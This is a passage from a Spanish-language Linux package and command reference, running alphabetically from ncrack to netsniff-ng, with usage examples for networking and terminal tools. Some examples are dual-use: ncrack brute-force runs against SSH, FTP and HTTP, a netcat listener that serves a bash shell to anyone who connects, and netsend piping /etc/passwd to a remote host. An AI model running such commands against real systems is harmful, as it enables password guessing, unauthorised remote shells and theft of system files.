$ ncrack -oN resultados.txt ssh://192.168.1.100 (guardar resultados en archivo)
$ ncrack -oX resultados.xml ssh://192.168.1.100 (guardar resultados en formato XML)
$ ncrack --resume sesion_guardada ssh://192.168.1.100 (continuar sesión previa)
Un ejemplo completo de auditoría a un servidor podría ser
$ ncrack -v -U common_users.txt -P top_1000_passwords.txt --connection-limit 5 -T3 -oN audit_results.txt ssh://192.168.1.100 ftp://192.168.1.100 http://192.168.1.100


ncurses-base
Contiene las definiciones básicas de tipos de terminal. Ver ncurses-bin.


ncurses-bin
Programas y páginas de manual relacionados con terminales. Las rutinas de la biblioteca ncurses ofrecen un método independiente de la terminal para actualizar las pantallas de caracteres con una optimización razonable. Este paquete contiene los programas utilizados para manipular la base de datos terminfo y las entradas individuales de terminfo, así como algunos programas para reiniciar terminales, entre otras funciones. Incluye las aplicaciones clear [ver], infocmp [ver], tabs, tic, toe [ver], tput [ver] y tset [ver]  .
$ tabs 4 (tabuladores cada 4 columnas)
$ tabs -d (restaurar configuración por defecto)
1.-
Ejemplo  de crear un terminal personalizado
$ nano mifancy.ti
mifancy|Mi terminal chulo,
	colors#256, bold=\E[1m, setaf=\E[3%p1%dm, clear=\E[H\E[2J,
$ tic mifancy.ti (compilar)
$ export TERM=mifancy
$ tput clear


ncurses-doc
Contiene una introducción a la escritura de programas con ncurses y una guía de los aspectos internos de la biblioteca ncurses. También incluye las páginas de manual de las bibliotecas. Colocar en el navegador la url /usr/share/doc/ncurses-doc/html/index.html


ncurses-examples
Contiene programas que demuestran las posibilidades de ncurses y prueban la biblioteca. Los ejemplos incluyen varios programas clásicos como solitario, batallas, reloj, ajedrez, las torres de Hanoi y muchos otros. Colocar en el navegador: file:///usr/lib/ncurses/examples/


ncurses-hexedit
Editor de archivos que permite editar y visualizar archivos en hexadecimal, además de su equivalente en texto ASCII o EBCDIC. Sus funciones estándar de edición incluyen insertar, eliminar, buscar (texto o bytes), resaltar cambios, deshacer, dos formatos de visualización y capturas de pantalla completa. También permite editar discos fijos. Incluye un convertidor binario/octal/decimal/hexadecimal.
$ hexeditor archivo.txt (ver el .txt en hexadecimal en modo interactivo)
$ hexeditor foto.jpg (abrir un archivo binario)
Algnos atajos para el modo interactivo
Ctrl+g --> ayuda
Ctrl+c --> salir
Ctrl-o --> guardar
Ctrl+x --> guardar y salir
Ctrl+u --> deshacer


ncurses-term
Contiene todas las definiciones de terminal que no se encuentran en el paquete ncurses-base. Ver ncurses-bin


nd
Herramienta diseñada para interactuar con servidores WebDAV [Web-based Distributed Authoring and Versioning], protocolo basado en HTTP que permite a los usuarios editar y gestionar archivos de forma colaborativa en servidores web remotos. Incluye operaciones como subir, descargar, recuperar, eliminar, bloquear y consultar propiedades de archivos o directorios, todo a través de métodos HTTP como GET, PUT, PROPFIND, DELETE, MKCOL. A diferencia de herramientas más completas como "cadaver" [ver], que tiene un modo interactivo similar a un shell FTP, "nd" es más pequeño y orientado a scripts. No soporta modo interactivo ni conexiones encriptadas con SSL/TLS, solo HTTP plano.
$ nd -u miusuario:micontra http://ejemplo.com/dav/archivo.txt (metodo GET por defecto, descargar un archivo y lo muestra en pantalla)
$ nd -u miusuario:micontra -P PUT http://ejemplo.com/dav/nuevo_archivo.txt < local_archivo.txt (subir un archivo local al servidor)
$ nd -u miusuario:micontra -P PROPFIND http://ejemplo.com/dav/ (listar el contenido de un directorio)
$ nd -u miusuario:micontra -P MKCOL http://ejemplo.com/dav/nuevo_directorio/ (crear un directorio)
$ nd -u miusuario:micontra -P DELETE http://ejemplo.com/dav/archivo_a_borrar.txt (eliminar un archivo)
$ nd -u miusuario:micontra -P COPY -H "Destination: http://ejemplo.com/dav/copia.txt" http://ejemplo.com/dav/original.txt (copiar un archivo)


ndiff
Herramienta que facilita la comparación de escaneos Nmap. Toma dos archivos de salida XML de Nmap e imprime las diferencias entre ellos, como hosts que se conectan y desconectan, puertos que se abren o cierran, etc.
$ ndiff scan1.xml scan2.xml (mostrará las diferencias entre los dos escaneos)
$ ndiff scan1.xml scan2.xml > differences.txt (guardar la salida de la comparación en un archivo)
$ ndiff --html scan1.xml scan2.xml > differences.html (generar salida en formato HTML)


ndisc6
Varias herramientas de diagnóstico IPv6  entre las que se incluyen ndisc6, rdisc6, rltraceroute6, tcptraceroute6, tcpspray.ndisc6, tracert6, tcpspray6, name2addr, addr2name y dnssort.
$ ndisc6 2001:db8::1 eth0 (envía solicitud NS [Neighbor Solicitation] para la dirección IPv6 dada usando la interfaz eth0 y muestra la respuesta recibida)
$ rdisc6 -v eth0 (solicita información de routers en la interfaz eth0 y muestra detalles de los anuncios de routers recibidos, incluyendo prefijos y parámetros asociados)
$ rltraceroute6 2001:db8::1 (traza la ruta de salto a salto hacia una dirección IPv6 mostrando información extra de cada salto de la ruta en el nivel de enlace)
$ tcptraceroute6 2001:db8::1 80 (traza la ruta por paquetes TCP al puerto 80 en la dirección IPv6 especificada)
$ tcpspray6 2001:db8::2 (envía un flujo de datos para medir el rendimiento TCP entre el host local y el destino IPv6 específico)
$ tcpspray.ndisc6 -l (inicia en modo escucha [servidor] listo para aceptar conexiones de prueba desde clientes)
$ tracert6 2001:db8::1 (muestra cada salto intermedio hasta llegar a la dirección destino)
$ name2addr www.ejemplo.com (devuelve la/s dirección/es IPv6 asociada/s al nombre de dominio)
$ addr2name 2001:db8::1 (muestra el nombre de host correspondiente a la dirección IPv6 dada)
$ dnssort 2001:db8::1 2001:4860:4860::8888 (ordena una lista de direcciones según la preferencia local de rutas o configuraciones, mostrando la mejor opción en primer lugar)


ndppd
[Neighbor Discovery Protocol Proxy Daemon]. Es un daemon que funciona como proxy para el protocolo NDP [Neighbor Discovery Protocol] en IPv6 entre dos o más interfaces. Su propósito principal es permitir que dispositivos en diferentes subredes IPv6 se comuniquen como si estuvieran en la misma red local, sin necesidad de configuraciones especiales en el kernel Linux. En redes IPv6, el protocolo NDP reemplaza a ARP de IPv4 para la resolución de direcciones. Normalmente, los routers no reenvían mensajes NDP entre subredes.
Ejemplo de configuración básica
# nano /etc/ndppd.conf
route-ttl 30000
proxy eth0 {
    router yes
    timeout 500
    ttl 30000
    # Regla para todas las direcciones
    rule * {
        static
    }
    # O regla específica para un prefijo
    rule 2001:db8:1234::/64 {
        auto
    }
}
# systemctl enable ndppd (habilitar inicio automático)
# journalctl -u ndppd -f (ver logs)
# ip -6 neighbor show (ver tablas NDP)
# ip -6 route show (ver rutas IPv6)
# ping6 2001:db8:1234::1 (probar conectividad)
1.-
Ejemplo completo de implementación
Router con dos interfaces. Configuración de interfaces
# ip link set eth0 up
# ip link set eth1 up
Asignar direcciones IPv6
# ip -6 addr add 2001:db8:1111::1/64 dev eth0
# ip -6 addr add 2001:db8:2222::1/64 dev eth1
Habilitar forwarding IPv6
$ echo 1 > /proc/sys/net/ipv6/conf/all/forwarding
Configurar ndppd
# nano /etc/ndppd.conf
route-ttl 30000
proxy eth0 {
    router yes
    rule 2001:db8:2222::/64 {
        static
    }
}
proxy eth1 {
    router yes
    rule 2001:db8:1111::/64 {
        static
    }
}
# systemctl start ndppd (iniciar servicio)


ne
Editor. Admite caracteres UTF-8, varias columnas y resaltado de sintaxis. Utiliza combinaciones de teclas breves, intuitivas y fáciles de recordar y, al mismo tiempo, proporciona todas las funciones que debería tener un editor. Es totalmente configurable, lo que permite al usuario cambiar el contenido de los distintos menús, crear fácilmente pequeñas macros y cambiar fácilmente las combinaciones de teclas existentes, siendo al mismo tiempo un editor pequeño y rápido. F1 para abrir menús y Esc para cerrarlos
$ ne --read-only --utf8 file.txt (solo lectura y codificación utf8)


needrestart
Comprueba qué demonios necesitan reiniciarse tras actualizaciones de bibliotecas.
# needrestart (comprobación básica)
# needrestart -k (solo comprobar si el kernel está obsoleto)
# needrestart -l (solo comprobar si las bibliotecas están obsoletas)
# needrestart -m a (establece el nivel de detalles técnicos en "avanzado")


needrestart-session
Implementa una notificación de las sesiones de los usuarios sobre sus procesos obsoletos después de las actualizaciones del sistema.
# needrestart-session
Nota.- Lo más normal es que muestre una ventana diciendo: "None of your processes need to be restarted" o sea que "No es necesario reiniciar ninguno de sus procesos"


neo
Recrea el efecto de lluvia digital de "The Matrix". Secuencias de caracteres aleatorios que se desplazan sin cesar por la pantalla de la terminal.
$ neo (forma básica)
$ neo -c red -m "linux es un sistema genial" (las letras en rojo y creando un mensaje en el centro de la pantalla)


neofetch
Muestra información del sistema. Instalación:
	$ git clone https://github.com/dylanaraps/neofetch.git
	$ cd neofetch
	# make install
$ neofetch (Básico)
$ neofetch --colors 9 3 5 10 7 9 (Modificando colores)


neovim
Bifurcación de Vim centrada en código y funciones modernas.


neowofetch
Muestra información del sistema Linux con el logotipo de la distribución. Es parecido a screenfetch [ver] para más extenso.
$ neowofetch


nessus
Scaner de vulneradilidades
Descargar nessus de: http://www.nessus.org/download/
Registrarnos en:  http://www.nessus.org/plugins/?view=register-info
Entrar el código de activación recibido por correo:
# /opt/nessus/bin/nessus-fetch --register 218B-76A4-CB0F-072B-AEEA
# /opt/nessus/sbin/nessus-adduser (Entrar usuario y contraseña)
# /opt/nessus/sbin/nessusd (Arrancar el servicio)
Abrir navegador y entrar en la pantalla de login con:
https://127.0.0.1:8834


net-acct
Herramienta que registra el tráfico de red. Proporciona un daemon que registra todo el tráfico que pasa por la máquina donde se ejecuta de forma similar a como lo hace tcpdump [ver]. El archivo de configuración en /etc/naccttab.
# systemctl enable net-acct (que inicie cuando arranca el sistema)
# nacctd -d -D (que se ejecute en modo de depuración y evitar que se desvincule como demonio)
# cat /var/log/net-acct/net-acct.log (ver los logs)


net-tools
Paquete que contiene herramientas importantes para controlar el subsistema de red del núcleo Linux. Incluye arp, ifconfig, netstat, rarp, nameif y route, además de utilidades relacionadas con tipos de hardware de red específicos como plipconfig, slattach, mii-tool y aspectos avanzados de configuración de IP: iptunnel, ipmaddr.


netavark
Alternativa moderna a CNI [Container Network Interface] escrita en Rust, diseñada específicamente para Podman y otros gestores de contenedores OCI.
Los servicios:
netavark-dhcp-proxy.socket --> Escucha en un socket para peticiones DHCP.
netavark-firewalld-reload.service --> Reconfigura el firewall cuando cambia la red de contenedores.
netavark-dhcp-proxy.service --> El servicio DHCP propiamente dicho y solo se activa cuando el socket recibe una petición.
Netavark se usa indirectamente a través de Podman [ver].
$ ps aux | grep netavark (ver los procesos de Netavark, cuando esté en uso)
# nft list ruleset | grep -i netavark (ver reglas iptables/nftables relacionadas)
# systemctl status netavark-dhcp-proxy.socket (ver estado del servicio)
# systemctl status netavark-firewalld-reload.service (ver estado del servicio)
# ss -lpt | grep netavark (ver sockets activos)


netbase
Datos fundamentales para el funcionamiento de la red TCP/IP clásica en sistemas Unix. Estos datos estan en los archivos: /etc/services, /etc/protocols, /etc/rpc y /etc/ethertypes. Su finalidad es proporcionar información básica a la biblioteca del sistema libc a través de funciones como getservbyname() y getservbyport(), a las herramientas de red como netstat, ss, lsof, tcpdump, nmap, etc., para mostrar nombres en lugar de números y a los demonios de servicios que escuchan en puertos para traducir nombres a números y viceversa en el contexto de redes.
$ nano /etc/protocols (ver nombres asignados a números de protocolos IP)
$ nano /etc/rpc (ver los nombres y números asignados a servicios RPC [Remote Procedure Call])
$ nano /etc/ethertypes (ver las definiciones de los tipos de protocolo Ethernet [EtherType])
$ nano /etc/services (ver la relación nombre/puerto TCP/UDP)
1.-
Un caso práctico con y sin /etc/services
Caso normal con netbase
$ ss -tln
Salida típica:
       State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
       LISTEN   0        128      0.0.0.0:ssh         0.0.0.0:*
       LISTEN   0        80       0.0.0.0:http        0.0.0.0:*
       LISTEN   0        50       0.0.0.0:https       0.0.0.0:*
       ...
Los puertos aparecen con nombres simbólicos [ssh, http, https] en lugar de números.
Caso sin netbase o sin /etc/services
# mv /etc/services /etc/services.bak
Y luego ejecutar el mismo comando:
$ ss -tln
la salida cambiará así:
       State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
       LISTEN   0        128      0.0.0.0:22          0.0.0.0:*
       LISTEN   0        80       0.0.0.0:80          0.0.0.0:*
       LISTEN   0        50       0.0.0.0:443         0.0.0.0:*
       ...
Solo aparecen los números de puerto, porque el sistema no puede traducirlos a sus nombres simbólicos (ssh, http, https).
# mv /etc/services.bak /etc/services (volver las cosas como estaban)


netcat
utilidad que se puede utilizar para practicamente cualquier cosa relacionada con el protocolo TCP/IP [navaja suiza]
Nota.- En algunas distros está ligeramente capado. Preferible bajarlo de http://netcat.sourceforge.net/download.php y compilarlo:
$ ./configure
$ make DFLAGS=" -DTELNET -DGAPING_SECURITY_HOLE"
# make install
$ nc -v -v -z 192.168.2.5 21 22 25 110 5900 (que se conecte a la IP, envie más información [-v por duplicado], que no envie ningún dato [-z] y que lo haga por los puertos mencionados [21,22,25,110,5900])
$ nc -l -p 3001 -e /bin/bash  (Que esté a la escucha [-l] en el puerto 3001 [-p] y que, cuando haya conexión, ejecute nuestra shell bash [-e ....])
$ nc IP_servidor 3001  (desde el cliente, conectamos con el servidor y todo lo que escribamos se enviará al bash del servidor y lo que nos responda aparecerá en nuestra pantallla. Para terminar la conexión CTROL-C)
$ telnet -l usuario IP_o_nombre_host 3001 (Otra forma de establecer la conexión.)
$ nc -l -p 3000 > archivo (Dejar el servidor listo para recibir un archivo)
$ nc IP_servidor 3000 < archivo  (enviar desde el cliente el archivo)
$ nc -zw2 www.nombre.com 80 && echo open  (comprobar si está abierto el puerto 80 de un host)
$ nc -l -p 10000 < pelicula.avi  (streaming de video-servidor)
$ nc IP_o_host 10000 | mplayer – (streaming de video-cliente)
$ nc -l -p 10000 < fichero.mp3  (streaming de  audio-servidor)
$ nc IP_o_host 10000 | madplay –  (streaming de audio-cliente)
$ nc -l -p http -c "cat index.html"  (servidor http)
$ echo “GET /” | nc www.google.com 80 > index.html  (copiar una página web)
$ nc -l -p 10000 -c "nc host 22" (Proxy. El trafico recibido en el puerto 10000 se redirige al 22 del host especificado)
$ nc towel.blinkenlights.nl 23  (visionar la guerra de las galaxias)
$ dd if=/dev/sda5 | nc -l -p 10000  (clonar un disco por red. En el servidor)
$ nc IP_o_host 10000 | dd of=sda5.img  (En el cliente)
$ nc -l -p 7777 > /dev/null  (Prueba de rendimiento entre dos máquinas. En el Servidor)
$ pv -r /dev/zero | nc IP_servidor 7777  (En el cliente)
opciones
-v -v	.-	mostrar máxima información
-z	.-	mostrar puertos a la escucha


netconfd
Es un demonio [servidor] que implementa el protocolo NETCONF [Network Configuration Protocol, RFC 6241] una alternativa moderna a SNMP o CLI manual, usado para la gestión y configuración remota de equipos de red [routers, switches, etc.] mediante XML sobre SSH o TLS.
# netconfd --superuser --no-startup --log-level=debug (arranca el demonio, con privilegios administrativos, no carga un archivo de configuración inicial y muestra información detallada)
# netconfd --superuser --module=ietf-interfaces --log-level=info (otra forma de arrancar el demonio)
Nota.- Por defecto, escuchará en el puerto 830/tcp [estándar NETCONF sobre SSH].
# netconfd --module=ietf-interfaces --module=ietf-ip --startup=./startup-cfg.xml (carga los módulos especificados y usa un archivo de arranque para definir la configuración inicial del dispositivo)
Ejemplo de uso
# nano /etc/ssh/sshd_config
Añadir la linea:
       Subsystem netconf /usr/sbin/netconf-subsystem
Luego un cliente puede conectarse así:
# ssh -s usuario@localhost netconf
y el servidor SSH ejecutará netconf-subsystem, que a su vez se comunica con el demonio netconfd.


netconsd
Daemon para recibir y procesar registros [logs] del kernel de Linux, que son enviados a través de la red usando el módulo netconsole. Este módulo permite que los mensajes del kernel se envíen a un host remoto en tiempo real, lo que es especialmente útil para depuración y monitoreo de sistemas donde el acceso físico o por consola es limitado. Soporta dos formatos, el formato antiguo de solo texto [Mensajes de log en texto plano] y formato extendido que incluye metadatos como nivel de log, timestamp, etc.
Configuración básica
# nano /etc/netconsd.conf
       # Escuchar en el puerto 6666 UDP
       port = 6666
       # Módulo de salida: guardar logs en un archivo
       [output_file]
       type = file
       filename = /var/log/netconsole.log
# systemctl enable netconsd  (que inicie al arrancar)
En la máquina que quiere enviar los logs del kernel, cargar el módulo netconsole con los parámetros adecuados:
# modprobe netconsole netconsole=@/eth0/@,6666@192.168.1.100/ ("@/eth0/" es la interfaz de red, 6666 el puerto del servidor netconsd y 192.168.1.100 es la IP del servidor donde corre netconsd)
# netconsd 6666 (ejecución básica, solo recibe en el puerto 6666)
# netconsd -t 4 -o filelogger.so 514 (usa 4 hilos, carga el módulo, escucha en 514)


netconsole
[arping netconsd]. Es un módulo del kernel de Linux que envía todos los mensajes de registro del kernel a través de la red a otro equipo. Fue diseñado para ser lo más instantáneo posible, permitiendo el registro incluso de los errores más críticos del kernel. También funciona desde contextos IRQ y no habilita interrupciones durante el envío de paquetes. Debido a estas necesidades específicas, solo se admiten redes IP, paquetes UDP y dispositivos Ethernet. Este paquete contiene un servicio que configura dinámicamente netconsole con uno o más hosts mediante sus nombres o direcciones IP.
$ netconsole-setup loghost.example.com (envía todos los logs del kernel al host especificado en el puerto 6666)
$ netconsole-setup +514@192.168.1.100 (envía logs detallados [+] al IP 192.168.1.100 en puerto 514, común para syslog, con soporte extendido activado)
$ netconsole-setup loghost1.example.com 6667@loghost2.example.com (envía logs a loghost1 al puerto por defecto 6666 y a loghost2, puerto 6667)
# systemctl enable netconsole.service (habilitar el sevicio al iniciar)


netdiag
Colección de pequeñas herramientas para analizar el tráfico de red y la configuración de hosts remotos. Incluye los ejecutables: tcpblast, netload, trafshow, netwatch, statnet y tcpspray.


netdiscover
Escáner de direcciones de red activo/pasivo mediante solicitudes ARP. netdiscover es una herramienta de reconocimiento de direcciones activa/pasiva, principalmente desarrollada para redes inalámbricas sin servidor DHCP, cuando se realiza wardriving. También se puede usar en redes con hubs y switches. Basada en libnet y libpcap, puede detectar pasivamente hosts en línea
o buscarlos mediante el envío activo de solicitudes ARP.
# netdiscover -i enp1s0 (escanear direcciones LAN en la red mencionada)
# netdiscover -i enp1s0 -f (escaneo rápido de direcciones LAN comunes en enp1s0 [búsqueda solo de gateways])
# netdiscover -i eth0 -r 172.26.0.0/24 (escanear rangos fijos)
# netdiscover -r 192.168.0.0/16 (lo mismo)
# netdiscover -s 0.5 (Escanear direcciones LAN comunes con un tiempo de espera de 0.5 milisegundos en lugar del valor predeterminado de 1)
# netdiscover -r 192.168.0.0/16 -f -s 0.5 (escanear un rango fijo y con un tiempo de espera de 0.5 milisegundos)
# netdiscover -p (solo detectar tráfico ARP)


netfilter-persistent
[iptables-persistent] Ver este paquete.


nethogs
Visualiza procesos que están consumiendo más ancho de banda en el sistema
# nethogs   (uso básico. Por defecto el dispositivo es eth0)
# nethogs eth0 eth1 (especificando dos redes)
# nethogs -t eth1  (en modo traza y especificando red)
# nethogs -d 5 eth1 (Actualizando datos cada 5 segundos)
# nethogs -p (modo promiscuo. Segun documentación no recomendado)
Pulsando:
	m --> Se cambian las unidades de medida a KB/s, B/s y MB/s
	s --> Ordenar por los datos enviados
	r --> Ordenar por los datos recibidos
	q --> Salir


netlabel-tools
Herramienta de gestión para el subsistema de seguridad de red del kernel de Linux,llamada NetLabel [Network Labeling]. Este paquete requiere que el kernel en ejecución sea compatible con NetLabel. NetLabel es un framework dentro del kernel de Linux que permite a los Módulos de Seguridad de Linux [LSM] como SELinux o Smack adjuntar atributos de seguridad [etiquetas] a los paquetes de red salientes y leer esos atributos en los paquetes entrantes. Su función principal es asignar etiquetas de seguridad a los paquetes de red. Tiene dos ejecutables: netlabel-config y netlabelctl
# netlabel-config reset (borra cualquier configuración de NetLabel cargada en el kernel y restablece el estado a los valores por defecto)
# netlabel-config load (carga la configuración de NetLabel especificada en el archivo /etc/netlabel.rules en el kernel, utilizando internamente el comando netlabelctl)
# netlabelctl unlbl add default address:192.168.0.0/16 label:bar (asignar la etiqueta de seguridad "bar" a cualquier paquete no etiquetado que provenga del rango de direcciones especificada)


netload
[netdiag]. Muestra la carga en la interfaz de red sin usar la propia interfaz. netload simplemente accede a las estadísticas del kernel. El archivo $HOME/.netloadrc permite agregar cualquier cantidad de interfaces de red, modificar la configuración de alarma y las preferencias de correo electrónico.
# netload eth0 -t 2 (actualizando cada 2 segundos)


netmask
Determina el conjunto más pequeño de máscaras de red para especificar un rango de hosts. Programa útil si se trabaja con firewalls o enrutadores.
$ netmask -d -s -c localhost (máxima información, salida estandar y formato CIDR de salida)
Nota.- El sistema de direcciones IP tal como lo utilizamos actualmente [IPv4[, hace tiempo que está agotado. Todas las direcciones posibles [al menos 4.294.967.296] ya han sido asignadas. Hace unas décadas hubo que pensar en una solución para resolver el problema. CIDR ayuda a ampliar la cantidad de direcciones disponibles.


netpbm
Conjunto de herramientas para manipulación de imágenes que permiten convertir entre muchos formatos gráficos conocidos [gif, bmp, jpg...] a un formato interno, o bien del formato interno a los formatos conocidos. Los formatos internos que utiliza son .ppm [Portable Pixel Map] para imágenes en color, .pgm [Portable Gray Map] para imágenes en escala de grises, y .pbm [Portable Bit Map] para imágenes formadas por bits de blanco y negro. A veces estos formatos aparecen bajo la extensión general .pnm, que abarca a todos ellos. Incluye más de 200  aplicaciones, tales como: jpegtopnm , pnmtojpeg , bmptoppm [man netpbm para un listado detallado],  muchos de estos formatos estan practicamente en desuso.
$ pbmtoascii -2x4 imagen.pbm  (convertir .pbm a ascii. Para mayor resolución -1x2)


netperf
Medir el rendimiento de la red. Ha de instalarse en el cliente y en el servidor. Utiliza el puerto 12865.
# netserver (servidor)
# netperf -H servidor -t TCP_STREAM -l 30 (en el cliente prueba TCP)
# netperf -H servidor -t UDP_STREAM -l 30 -- -m 1472 (en el cliente prueba UDP)
# nmap -O -p 12865 localhost | grep tcp (comprobar si el puerto esta abierto)
       12965/tcp closed unknown
# nmap localhost -p 12865 | grep tcp (abrir el puerto)
       12865/tcp open  unknown
# netperf -H localhost


netperfmeter
Generador de tráfico y medidor de rendimiento de red para los protocolos de transporte UDP, TCP, MPTCP, SCTP y DCCP sobre IPv4 e IPv6. Transmite simultáneamente flujos bidireccionales a un punto final y mide el ancho de banda y la calidad de servicio (QoS) resultantes. Incluye los ejecutables combinesummaries, createsummary, extractvectors, getabstime, netperfmeter y runtimeestimator.
$ netperfmeter -s 8080 (servidor. Escucha en puerto 8080)
$ netperfmeter -c servidor.example.com:8080 -t 10 -P tcp (cliente. envía tráfico TCP durante 10 segundos)
$ netperfmeter -c servidor:8080 -t 30 -P udp -n 4 --bidir (flujos UDP bidireccionales durante 30 segundos)
$ netperfmeter -c servidor:8080 -t 60 -P tcp -n 2 --bidir --qos > datos.log (flujos TCP bidireccionales durante 60 segundos y medición QoS)
$ netperfmeter -c [2001:db8::1]:8080 -P tcp -t 60 --qos (con IPv6 y medición QoS)
$ createsummary datos_brutos.log > resumen.csv (crea resúmenes estadísticos)
$ combinesummaries prueba1.csv prueba2.csv prueba3.csv > total.csv (combina múltiples resúmenes)
$ extractvectors --vector throughput datos_completos.log (extrae vectores de datos específicos)
$ getabstime 1634567890.123456 (convertir timestamp a formato legible)
$ eruntimeestimator --flows 10 --duration 300 (stimar tiempo para prueba específica)


netperfmeter-plotting
Solo genera gráficos a partir de resultados, no realiza mediciones por sí mismo.
$ plot-netperfmeter-results resultados.log -o graficos/ (generar gráficos desde datos de netperfmeter)


netpipe
[NETwork Protocol-Independent Performance Evaluator]. Suite de herramientas [netpipe-lam netpipe-mpich2 netpipe-openmoi netpipe-tcp] para medir el rendimiento de red de forma exhaustiva. Cada variante está diseñada para un protocolo o implementación de comunicación específica. Entre las 4 herramientas incluyen los ejecutables NPlam, NPlam2, NPmpich2, NPopenmpi, NPopenmpi2 y NPtcp
$ NPtcp -r -p 5002 (en el servidor, modo receptor y puerto. Por ejemplo el servidor es la máquina 192.168.1.10)
$ NPtcp -h 192.168.1.10 -p 5002 -n 100 -l 1 -u 1048576 -o resultados.txt (en el cliente, máquina destino, puerto, 100 pruebas, tamaño mínimo u máximo de mensajes en bytes y guardar resultados)
$ mpiexec -n 2 -hosts nodo1,nodo2 NPmpich2 -o mpich2_results.txt (lanzar en 2 nodos)
$ mpiexec -f hostfile NPmpich2 (lo mismo con un archivo de hosts: 1 por linea)
$ mpiexec -n 2 -f hostfile NPmpich2 -a -s -l 1 -u 4194304 (-a incluye pruebas asíncronas y -s sincronización adicional)
$ mpirun -np 2 --host host1,host2 NPopenmpi -o openmpi_results.txt (uso típico)
$ mpirun -np 2 --mca btl tcp,self --host servidor1,servidor2 NPopenmpi (lo mismo con más control)
$ mpirun -np 2 --mca btl tcp,self NPopenmpi -o tcp_transport.txt (comparando diferentes transportes)
$ mpirun -np 2 --mca btl openib,self NPopenmpi -o ib_transport.txt (usando infiniband)
$ lamboot -v -b hostlist (iniciar LAM/MPI. El archivo "hostlist" contendrá un host por linea. Prueba de latencia y throughput)
$ mpirun -np 2 NPlam -P -b 65536 -o tcp_benchmark.txt (después de lamboot, ejecutar con opciones de TCP. Tamaño del buffer en 64 KB)
$ mpirun -np 2 NPlam -P -o resultado.txt (lo mismo guardando resultados)
$ lamhalt (limpiar la terminal)
$ NPtcp -h servidor -l 1 -u 10485760 | grep "Peak" (identificar cuellos de botella)
Nota.- El paquete netpipe-lam es para entornos heredados. Para entornos modernos, se recomienda usar netpipe-tcp o netpipe-mpich2 en lugar de netpipe-lam.


netplan-generator
Este paquete proporciona un generador de systemd para configurar diversos demonios de red durante el arranque. Su función es leer los archivos YAML de configuración en /etc/netplan/ y generar automáticamente los archivos de configuración para los backends de red como /run/systemd/network/ para systemd-networkd.
1.-
Ejemplo de configuración simple para NetworkManager con DHCP automático en todas las interfaces
# nano /etc/netplan/01-network-manager-all.yaml
network:
  version: 2
  renderer: NetworkManager
Una ves aplicada NetworkManager manejará la conexión [ver netplan.io].
2.-
Ejemplo de configuración estática para una interfaz Ethernet con systemd-networkd
Para un servidor, donde se quiere una IP fija en la interfaz enp0s
# nano /etc/netplan/01-netcfg.yaml
network:
  version: 2
  renderer: networkd
  ethernets:
    enp0s3:
      dhcp4: no  # Desactiva DHCP para IPv4
      addresses: [192.168.1.10/24]  # IP estática y máscara
      routes:
        - to: default
          via: 192.168.1.1  # Gateway
      nameservers:
        addresses: [8.8.8.8, 8.8.4.4]  # DNS (Google DNS como ejemplo)
3.-
Ejemplo de conexión WiFi con WPA2 y DHCP en un laptop, usando NetworkManager.
# nano /etc/netplan/50-wifi.yaml`
network:
  version: 2
  renderer: NetworkManager
  wifis:
    wlan0:  # Nombre de la interfaz WiFi
      dhcp4: yes
      access-points:
        "Mi-Red-WiFi":
          password: "mi-contrasena-secreta"


netplan.io
Utilidad de configuración de red que simplifica la configuración de interfaces de manera declarativa, utilizando archivos en formato YAML. En lugar de editar directamente archivos de configuración de backends como NetworkManager o systemd-networkd, se define la configuración deseada en YAML, y Netplan genera automáticamente los archivos necesarios para el backend elegido durante el arranque o manualmente asegurando que la red se configure correctamente.
# netplan generate (genera los archivos de config sin aplicar)
# netplan apply (aplica los cambios reiniciando los servicios de red si es necesario)
# netplan try (prueba los cambios temporalmente y se revierten si no se confirma en 120 segundos)
# netplan try --timeout=60 (lo mismo pero con 60 segundos)
# netplan --debug apply (ver logs detallados)


netplug
Demonio que monitorea el estado del enlace de las tarjetas de red y configura la red en eventos de conexión y desconexión. Es similar a ifplugd, pero usa NETLINK en lugar de sondear regularmente el estado del enlace. Esto mejora el consumo de energía con las computadoras portátiles, pero no funciona con todas las tarjetas.


netproc
monitorea el tráfico de la red e intenta averiguar a qué proceso pertenece este tráfico; esto es útil para identificar los procesos que consumen recursos de la red y solucionar problemas.
# netproc -i enp1s0 (forma básica especificando la interfaz. Por defecto todas)
# netproc -p tcp -c -f "netproc.txt" (visualizar cada acción activa del proceso tcp y guardar datos en el archivo especificado en el directorio actual)


netr
Monitor de interfaz de red simple que muestra estadísticas de tráfico.
$ netr


netrik
Navegador WWW avanzado en modo texto. Su propósito es dar acceso a la mayor cantidad de Web posible en modo texto, sin renunciar a ninguna comodidad. La interfaz de usuario se parece más o menos a una combinación de gVim y PINE. El problema actual [2020] es que netrik no admite HTTPS ni IPv6 todavía.


netselect
Probar la velocidad de los servidores de red para elegir el más rápido. Puede procesar una lista de servidores y elegir el más rápido/más cercano automáticamente.
# netselect -vv -t 20 http://deb.debian.org/debian/ (más cantidad de información [-v, -vv, -vvv] y probando 20 paquetes de envio [por defecto 10])
# netselect -vv -s 5 http.us.debian.or (que muestre los 3 mejores servidores y el del final sea el mejor)


netsend
Programa que transmite y recibe archivos y diagnóstico de redes. Ofrece los protocolos de transporte TCP, DCCP, UDP, UDPLITE y SCTP, utilizando IPv4 o IPv6 en la capa de red. No añade formato de aplicación [no es FTP, HTTP, SCP...], lo que envía por la red son los bytes exactos que lee de un fichero o de la entrada estándar, y viceversa.
$ netsend -l 5001 (en el servidor)
$ netsend 192.168.1.10 5001 < /etc/passwd (en el cliente, el contenido de /etc/passwd pasará al servidor)
$ netsend -l 5001 -6 (en el servidor, mismo ejemplo pero con IPv6)
$ netsend 2001:db8::a 5001 -6 < /etc/passwd (en el cliente)
$ dd if=debian-12.iso | netsend -v srv.desarrollo.local 8000 (enviar un ISO grande y medir tiempo)
$ netsend -l 8000 -v > debian-12.iso (en el servidor)
$ yes | head -c 100M | netsend -p udp 10.0.0.5 9000 (en el cliente generar tráfico UDP)
$ netsend -l 9000 -p udp > /dev/null (en el receptor)
$ netsend -l 7000 -p dccp (en el servidor, comprobar que el kernel soporta DCCP)
$ netsend 127.0.0.1 7000 -p dccp < /dev/zero (en el cliente. Si no hay soporte el programa lo indicará inmediatamente)
$ netsend -l 5000 (en el servidor para enviar texto tecleado)
$ netsend 192.168.1.10 5000 (en el cliente todo lo que escriba por teclado se retransmite en caliente)


netsniff-ng
